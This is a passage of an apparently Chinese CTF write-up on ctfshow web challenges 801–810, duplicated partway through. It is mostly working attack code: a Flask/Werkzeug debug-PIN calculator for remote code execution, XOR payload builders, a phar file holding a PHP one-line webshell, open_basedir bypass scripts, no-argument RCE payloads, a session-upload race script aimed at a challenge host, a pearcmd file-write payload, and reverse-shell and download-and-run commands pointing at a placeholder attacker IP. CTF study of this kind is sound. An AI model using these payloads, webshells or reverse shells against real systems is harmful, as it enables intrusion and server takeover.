       if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\n由上可以看得出PIN值生成所需要获取的数据有\n\n- username，用户名\n- modname，默认值为flask.app\n- appname，默认值为Flask\n- moddir，flask库下app.py的绝对路径\n- uuidnode，当前网络的mac地址的十进制数\n- machine_id，docker机器id或本机id\n\n首先是用户名\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\n可用的似乎只有root\n\n下面三项任意报错即可获得\n\nmac地址\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\n本机生成脚本如下\n\n```python\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n```python\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n使用最终生成的PIN进入代码调试，RCE\n\n**802**\n\n### 无字母数字命令执行\n\n异或法，偷个脚本喵喵\n\n```php\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n```\n\n```python\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### phar文件包含\n\n来自大佬的提示：把phar当压缩包用就行\n\n首先生成包含一句话木马的phar文件\n\n```php\n<?php\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //设置stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// phar生成\n?>\n```\n\n此时phar包中的test.txt中的内容就是我们的一句话木马了\n\n上传文件（记得读取然后url编码一下）\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\ninclude干\n\n![截屏2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/截屏2022-06-06 20.00.48.png)\n\n**804**\n\n### phar反序列化\n\n这不用教吧\n\n```php\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n// phar生成\n\n?>\n```\n\n上传phar协议读取就行\n\n**805**\n\n### open_basedir绕过\n\n> open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。\n>\n> 假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。\n>\n> 注意：用open_basedir指定的**限制实际上是前缀，而不是目录名**。\n>\n> 文章来自[这里](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\n但是这个配置对系统命令执行是没有效果的，比如执行`system('ls /')`的时候就不受限制，~~但是一般都会被ban掉~~\n\n下面就是一些bypass方法\n\n1. glob协议，只能捞捞文件名\n\n   ```php\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. 利用chdir()与ini_set()组合Bypass\n\n   原理在这里\n\n   ```php\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. 利用bindtextdomain()函数Bypass\n\n   这个方法也只能捞捞文件名\n\n   > **bindtextdomain()函数**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()函数用于绑定domain到某个目录的函数。\n   >\n   > ```php\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()函数的第二个参数\\$directory是一个文件路径，它会在\\$directory存在的时候返回\\$directory，不存在则返回false。\n\n   我们就可以通过修改directory参数根据返回值来判断文件是否存在\n\n4. 利用SplFileInfo::getRealPath()类方法Bypass\n\n   这个和上面那个很相似，也是基于报错，直接给payload吧\n\n   ```php\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. 利用realpath()函数Bypass\n\n   > ### realpath()函数\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。\n   >\n   > 函数定义如下：\n   >\n   > ```php\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > 环境条件：Windows\n   >\n   > 基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符<和>，不然只能进行暴破。\n\n   ```php\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：\n\n   ![](https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/10.png)\n\n最后是大佬脚本\n\n```php\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\ninclude远程文件后传参file即可\n\n**806**\n\n### php无参RCE\n\n首先是一篇可供参考的[文章](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\n利用方式有以下几种\n\n1. **利用session_id**\n\n   php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () '，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去，`bin2hex('payload');`来转换16禁止，在使用时通过`eval(hex2bin(session_id(session_start())));`，在加上请求头中Cookie中的`PHPSESSID=16进制payload`执行\n\n2. **利用`get_defined_vars ()`函数**\n\n   `get_defined_vars()`：返回由所有已定义变量所组成的数组\n\n   可供利用的函数\n\n   ```php\n   end() - 将内部指针指向数组中的最后一个元素，并输出。\n   next() - 将内部指针指向数组中的下一个元素，并输出。\n   prev() - 将内部指针指向数组中的上一个元素，并输出。\n   reset() - 将内部指针指向数组中的第一个元素，并输出。\n   each() - 返回当前元素的键名和键值，并将内部指针向前移动。\n   ```\n\n   可以看到在已定义的变量中存在着全局变量GET和POST，我们可以通过传入参数来实现RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. 文件读取\n\n   可供利用的函数\n\n   ```\n   var_dump()  打印所有内容\n   print_r()  同上\n   scandir()  扫描路径内文件名并返回一个迭代器\n   localeconv()  \n   getcwd()  获得当前工作目录\n   getallheaders()  获得请求头内容\n   \n   ```\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### 反弹shell\n\n本地监听端口，记住要有公网IP，也可以使用frp内网穿透\n\n1. 公网服务器\n\n   监听命令\n\n   ```\n   攻击端\n   nc -lvp 监听的端口\n   受害端\n   bash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\n   nc 攻击端IP 攻击端监听端口 -t /bin/bash\n   ```\n\n   利用wget下载执行\n\n   ```\n   wget 攻击端IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   python脚本反弹\n\n   ```python\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"攻击端IP\",攻击端监听端口)) #更改localhost为⾃⼰的外⽹ip,端⼝任意\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### 卡临时文件包含\n\n```python\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\n纯纯看运气\n\n**809**\n\n### pear文件包含/RCE\n\n文章[在此](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。\n>\n> 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。\n>\n> 原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。\n>\n> 我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。\n>\n> 如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？\n>\n> HTTP数据包中的query-string会被作为argv的值\n\n最终构造的payload如下\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\n此时/tmp/hello.php文件中就有了我们写入的`<?=phpinfo()?>`，文件包含即可\n\n**810**\n\n### SSRF打PHP-FPM\n\n有工具不用***\n\n```\ntitle: CTFshow常用姿势\ndate: 2022-06-04 16:20:22\ntags:\n```\n\n**801**\n\n### flask计算PIN\n\n**什么是PIN码**\n\nPIN码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式\n\n**注意事项：谨记！！python 3.8（md5）和3.6（sha1）pin码生成方式不同**\n\n**使用条件：flask debug模式开启 存在任意文件读取**\n\n首先是python PIN码的生成脚本\n\n```\n#生效时间为一周\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#获取机器号\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #读取文件进行拼接\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #继续进行拼接，这里处理一下只要/docker后的东西\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\n由上可以看得出PIN值生成所需要获取的数据有\n\n- username，用户名\n- modname，默认值为flask.app\n- appname，默认值为Flask\n- moddir，flask库下app.py的绝对路径\n- uuidnode，当前网络的mac地址的十进制数\n- machine_id，docker机器id或本机id\n\n首先是用户名\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\n可用的似乎只有root\n\n下面三项任意报错即可获得\n\nmac地址\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\n本机生成脚本如下\n\n```\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# 默认值\n    'Flask',# 默认值\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16进制转10进制\n    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n使用最终生成的PIN进入代码调试，RCE\n\n**802**\n\n### 无字母数字命令执行\n\n异或法，偷个脚本喵喵\n\n```\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### phar文件包含\n\n来自大佬的提示：把phar当压缩包用就行\n\n首先生成包含一句话木马的phar文件\n\n```\n<?php\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //设置stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// 